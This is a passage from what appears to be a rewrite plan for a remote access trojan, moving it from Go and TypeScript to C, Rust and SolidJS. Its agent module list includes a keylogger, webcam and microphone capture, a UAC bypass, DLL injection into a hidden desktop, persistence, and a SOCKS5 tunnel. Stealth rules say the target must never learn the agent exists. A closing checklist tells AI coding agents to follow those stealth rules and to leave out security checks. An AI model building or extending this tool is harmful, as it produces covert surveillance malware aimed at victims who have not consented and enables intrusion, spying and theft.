  // Shared streaming logic: connect WS, decode frames, render to canvas
  // Tracks: FPS, latency, network stats
  // Handles: quality, codec, transport mode
  // Returns: canvas ref, stats signals, controls
}
```

### 2.6 SPA Routing

```tsx
// web/src/router.tsx
<Router>
  <Route path="/login" component={Login} />
  <Route path="/" component={Layout}>
    <Route path="/" component={Dashboard} />
    <Route path="/console/:id" component={Console} />
    <Route path="/remote-desktop/:id" component={RemoteDesktop} />
    <Route path="/backstage/:id" component={Backstage} />
    <Route path="/webcam/:id" component={Webcam} />
    <Route path="/voice/:id" component={Voice} />
    <Route path="/files/:id" component={FileBrowser} />
    <Route path="/processes/:id" component={Processes} />
    <Route path="/keylogger/:id" component={Keylogger} />
    <Route path="/screenshots/:id" component={Screenshots} />
    <Route path="/build" component={Build} />
    <Route path="/settings" component={Settings} />
    <Route path="/purgatory" component={Purgatory} />
    <Route path="/notifications" component={Notifications} />
    <Route path="/scripts" component={Scripts} />
    <Route path="/deploy" component={Deploy} />
    <Route path="/logs/:id" component={Logs} />
    <Route path="/metrics" component={Metrics} />
    <Route path="/plugins" component={Plugins} />
    <Route path="/socks5" component={Socks5Manager} />
  </Route>
</Router>
```

**Removed routes:** `/register`, `/users`, `/file-share`, `/change-password`

---

## Phase 3 — Agent (Week 11-20)

### 3.1 C Dependencies (Third-Party Libraries)

| Library | Purpose | License | Size | Platforms |
|---------|---------|---------|------|-----------|
| `msgpack-c` | Msgpack encode/decode | Boost | Small | All |
| `libwebsockets` | WebSocket client | LGPL 2.1 + static link exception | Medium | All |
| `stb_image.h` / `stb_image_write.h` | JPEG encode/decode | Public Domain | Header-only | All |
| `opus` | Audio encoding | BSD | Small | All |
| `parson` | JSON parsing (for config) | MIT | Tiny | All |
| `wasm3` | WASM plugin runtime | MIT | ~80KB | All |
| `libX11` / `libXext` | X11 screen capture | MIT | System | Linux only |
| `libdatachannel` | WebRTC (deferred to v2) | MPL 2.0 | Medium | All |

**No runtime dependencies.** Everything statically linked. Binary is a single file.

**Removed third-party:**
- `usrsctp` — was for WebRTC data channels, WebRTC deferred to v2
- `pion-webrtc` — Go library, replaced by libdatachannel (v2)

### 3.2 Agent Module Porting Order

| Batch | Module | Key APIs | Platforms |
|-------|--------|----------|-----------|
| 1 | `wire/` (msgpack codec, protocol structs) | None | All |
| 2 | `config/` (identity, HWID) | GetVolumeSerialNumber / machine-id | Win+Linux |
| 3 | `stealth/` (crash log, hardcrash, error mode) | SetErrorMode, SEH | Win (Linux no-op) |
| 4 | `mutex/` (single instance) | CreateMutexW / flock | Win+Linux |
| 5 | `persistence/` (registry/crontab/startup/tasksched) | RegSetValueExW / crontab | Win+Linux |
| 6 | `sysinfo/` (CPU, GPU, RAM, battery, admin) | GetSystemInfo / sysfs | Win+Linux |
| 7 | `session.c` (WS connect, reconnect, TLS, hello) | libwebsockets | All |
| 8 | `notification/` (active window monitor) | GetForegroundWindow / XGetInputFocus | Win+Linux |
| 9 | `screenshot/` (multi-monitor capture) | BitBlt / XShm | Win+Linux |
| 10 | `console/` (PTY, cmd/powershell/bash) | CreatePseudoConsole / forkpty | Win+Linux |
| 11 | `clipboard/` (clipboard sync) | OpenClipboard / XClipboard | Win+Linux |
| 12 | `keylogger/` (keyboard hook) | SetWindowsHookEx / XInput | Win (Linux stub) |
| 13 | `processes/` (process list, kill) | CreateToolhelp32Snapshot / procfs | Win+Linux |
| 14 | `files/` (full file browser) | FindFirstFileW / opendir | Win+Linux |
| 15 | `scripts/` (PowerShell/bash execution) | CreateProcessW / exec | Win+Linux |
| 16 | `elevation/` (UAC bypass) | ShellExecuteExW | Win (Linux no-op) |
| 17 | `socks5/` (proxy tunnel) | WSAConnect / connect | All |
| 18 | `capture/` (DXGI + BitBlt + XShm + H264/NVENC) | IDXGIOutputDuplication, XShm | Win+Linux |
| 19 | `desktop/` (streaming + input) | SendInput / XTest | Win+Linux |
| 20 | `backstage/` (hidden desktop + DLL inject) | CreateProcessW, WriteProcessMemory | Win only |
| 21 | `webcam/` (DirectShow capture) | CoCreateInstance, IGraphBuilder | Win only |
| 22 | `voice/` (winmm audio) | waveInOpen, waveOutOpen | Win only |
| 23 | `audio/` (desktop audio capture) | WASAPI / PulseAudio | Win+Linux |
| 24 | `privacy/` (overlay + input block) | CreateWindowExW | Win only |
| 25 | `plugins/` (DLL/WASM loader) | LoadLibraryW / dlopen, wasm3 | Win+Linux |
| 26 | `webrtc/` (deferred to v2) | libdatachannel | All |

### 3.3 Agent Build Configuration

| Flag | C Equivalent |
|------|--------------|
| Server URL | `-DSERVER_URL=\"wss://...\"` in `build.h` |
| Persistence | `-DPERSISTENCE=1` |
| Mutex | `-DMUTEX=\"...\"` |
| Agent Token | `-DAGENT_TOKEN=\"...\"` |
| Build Tag | `-DBUILD_TAG=\"...\"` |
| Sleep | `-DSLEEP_SECONDS=0` |
| Critical Process | `-DCRITICAL_PROCESS=0` |
| Collect CPU/GPU/RAM/Storage | `-DCOLLECT_CPU=1` etc |
| Secure Log Key | `-DSECURE_LOG_KEY=\"...\"` |
| Solana Address | `-DSOL_ADDRESS=\"...\"` |

### 3.4 Agent Stealth Requirements (CRITICAL)

- **NEVER** show Windows error popups — `SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX)`
- **NEVER** write visible error output — no `printf`, no `fprintf(stderr, ...)`, all logs go to hidden temp files
- **ALWAYS** use `__try/__except` (MSVC) or signal handlers (MinGW) to catch crashes silently
- **ALWAYS** suppress `AllocConsole` and `GetConsoleWindow` — if console exists, hide it immediately
- **ALWAYS** swallow errors — the target must never know the agent exists
- Crash logs → `%TEMP%\\.goylord\\crash_<timestamp>.log` (hidden directory)
- On Linux: redirect stderr to `/tmp/.goylord/crash_<timestamp>.log` with 0600 permissions

### 3.5 Agent WASM Plugin Runtime

**Recommendation: `wasm3`** — ~80KB, MIT license, sufficient for plugin WASM modules.

### 3.6 Agent WebRTC

**Recommendation:** Start with canvas-only (JPEG/H264 over WS), add `libdatachannel` later as v2 enhancement.

---

## Phase 4 — Desktop (Week 21-22)

### 4.1 Tauri v2 Configuration

1. Point `tauri.conf.json` to `../web/dist/` for the built SolidJS frontend
2. Keep all 4 Tauri commands: `get_saved_connection`, `get_pending_error`, `connect_to_server`, `go_back_to_connect`
3. Keep popup handling (`on_new_window` → new `WebviewWindow`)
4. Keep NSIS installer config (Windows only — matches target platforms)

### 4.2 No Separate Desktop Code

The desktop app IS the web app wrapped in Tauri. Zero desktop-specific code beyond the Tauri shell.

---

## Phase 5 — Integration & Testing (Week 23-26)

### 5.1 Integration Test Plan

| Test | What | How |
|------|------|-----|
| Server unit tests | Each route, each WS handler | `cargo test` with mock clients |
| Server integration | Full login → WebSocket → command flow | Test client binary in Rust |
| Frontend unit tests | Components, stores | Vitest + solid-testing-library |
| Frontend E2E | Full user flows | Playwright |
| Agent unit tests | Individual handlers | C test harness with mock WS |
| Agent integration | Full connect → stream → command cycle | Test server + test agent |
| Protocol compatibility | Old Go agent ↔ new Rust server | Run old agent against new server |
| Migration | Old SQLite → new server migrates on first start | Point new server at old DB file |

### 5.2 Backward Compatibility Strategy

Each component swappable independently:

1. **Phase A:** New Rust server reads old SQLite DB (migrates dropped tables/columns on first start)
2. **Phase B:** Old Go agent works with new Rust server (same msgpack protocol)
3. **Phase C:** Old web UI works with new Rust server (same HTTP API — minus removed endpoints)
4. **Phase D:** New SolidJS web UI works with old TS server (same API endpoints)
5. **Phase E:** New C agent works with old TS server (same wire protocol)

### 5.3 Migration Path

```
Week 1-6:   Build new Rust server. Test with old Go agent + old web UI.
Week 7-10:  Build new SolidJS web UI. Test with old TS server + new Rust server.
Week 11-20: Build new C agent. Test with old TS server + new Rust server.
Week 21-22: Update Tauri desktop to point at new web UI.
Week 23-26: Full integration testing. Switch over component by component.
```

---

## File Count & Effort Estimate

| Component | Current Files | Current Lines | Rewrite Files | Rewrite Lines (est.) | Effort |
|-----------|--------------|---------------|---------------|---------------------|--------|
| Server | 83+ | ~30,000 TS | ~30 Rust | ~12,000 Rust | 5 weeks |
| Frontend | 73 JS + 29 HTML | ~33,000 JS | ~50 TSX | ~10,000 TSX | 4 weeks |
| Agent | 64 handlers + 76 capture | ~20,000 Go | ~40 C | ~18,000 C | 10 weeks |
| Desktop | 4 Rust + 3 web | ~400 | ~4 Rust | ~300 Rust | 1 week |
| Protocol | N/A | N/A | 1 TOML + 3 generators | ~500 | 1 week |
| **Total** | **~250** | **~83,400** | **~130** | **~40,800** | **~21 weeks** |

---

## Key Decisions

| Decision | Resolution |
|----------|------------|
| Agent WebRTC in v1? | **No** — canvas-only first, add WebRTC in v2 |
| Agent WASM plugins in v1? | **Yes** — wasm3 is small enough |
| Protocol code generation? | **Yes** — TOML → Rust/TS/C, prevents sync bugs |
| SQLite migration tool? | **Yes** — auto-migrate on first start (drop removed tables, remove dropped columns) |
| Frontend SSR? | **No** — CSR SPA, served as static files by Rust |
| Desktop separate or monorepo? | **Monorepo** — same web/ directory |
| Agent cross-compile from Linux? | **Yes** — MinGW for Windows, native GCC for Linux |
| Config format? | **TOML** — Rust ecosystem standard |
| Keep garble obfuscation? | **No** — C strip + LTO is sufficient |
| Multi-user? | **No** — single admin, credentials in config.toml |
| Branding? | **No** — hardcoded identity |
| Registration? | **No** — no self-service signup |
| File Share? | **No** — removed |
| MFA? | **No** — single admin |
| OIDC? | **No** — single admin |

---

## DO NOT IMPLEMENT (Carry Over from AGENTS.md)

| ID | Feature | Reason |
|----|---------|--------|
| C11 | HTTP plugin URL rejection | User decided against it |
| C12 | `taskkill` dangerous name restrictions | User decided against it |
| C13 | File upload directory restrictions | User decided against it |
| S1 | Require `AGENT_TOKEN` at startup | User decided against it |

Agent stealth rules carry over verbatim — the C agent must be completely silent on the target machine.

---

## Removed Architecture Leftovers

Beyond the feature removals above, these **artifacts and leftovers** from removed features must NOT appear in the rewrite:

| Leftover | Where It Was | Why It's Dead |
|----------|-------------|---------------|
| Script templates referencing macOS permissions | Go agent handlers | macOS removed |
| `darwin_request_permissions` command handler | Go agent command.go | macOS removed |
| macOS folder access denial/request in file handler | Go agent files.go | macOS removed |
| macOS keylogger permission gate in session | Go agent session.go | macOS removed |
| `runtime.GOOS == "darwin"` checks | Go agent throughout | macOS removed |
| `runtime.GOARCH == "arm64"` Windows checks | Go agent sysinfo_windows.go | Windows ARM64 removed |
| `can_user_build` permission check in build routes | Server build-routes.ts | Single admin can always build |
| `can_upload_files` permission check in file-share | Server file-share-routes.ts | File Share removed entirely |
| `requirePermission()` calls in all routes | Server all route files | No RBAC — single admin has all access |
| `canUserAccessClient()` filtering | Server client-routes.ts | No user-scoped client access |
| `canUserAccessFeature()` gating | Server throughout | No feature gating |
| `/api/login/branding` fetch on login page load | Frontend login.js | Branding removed |
| Register link on login page | Frontend login.js | Registration removed |
| Users sidebar nav entry | Frontend nav/template.js | No user management |
| File Share sidebar nav entry | Frontend nav/template.js | File Share removed |
| Branding settings section in Settings page | Frontend settings.js | Branding removed |
| Registration settings section in Settings page | Frontend settings.js | Registration removed |
| User management settings section in Settings page | Frontend settings.js | No user management |
| `file_share_uploaded` event in build page | Frontend build.js | File Share removed |
| Per-user build profiles | DB build_profiles | Global profiles only |
| Per-user saved scripts | DB saved_scripts | Global scripts only |
| Per-user auto_scripts/auto_deploys | DB auto_scripts/auto_deploys | Global, no created_by_user_id |
| Per-user metrics | DB/API | Single admin, global metrics |
| `built_by_user_id` column in clients table | DB schema | No user attribution |
| `built_by_user_id` column in builds table | DB schema | No user attribution |
| `updated_by_user_id` in shared_ui_settings | DB schema | Single admin |

---

## Checklist for Any Agent or Person

Before touching any code, verify:

- [ ] You have read this entire REWRITE.md
- [ ] You have read AGENTS.md (constraints still apply)
- [ ] You understand the current codebase (server routes, WS handlers, agent handlers)
- [ ] You understand the protocol (msgpack, message types, command types)
- [ ] You are not implementing C11/C12/C13/S1
- [ ] You are following the stealth rules for the agent
- [ ] You are NOT porting any removed feature (multi-user, branding, registration, file share, MFA, OIDC)
- [ ] You are NOT supporting removed platforms (macOS, FreeBSD, Android, iOS, Windows ARM64)
- [ ] You are removing all leftovers from removed features (no dead code, no orphan references)
- [ ] You are updating Changes.md and CHANGELOG.md after every change
- [ ] You are testing backward compatibility with old components
- [ ] You are committing to one component at a time (server → frontend → agent → desktop)
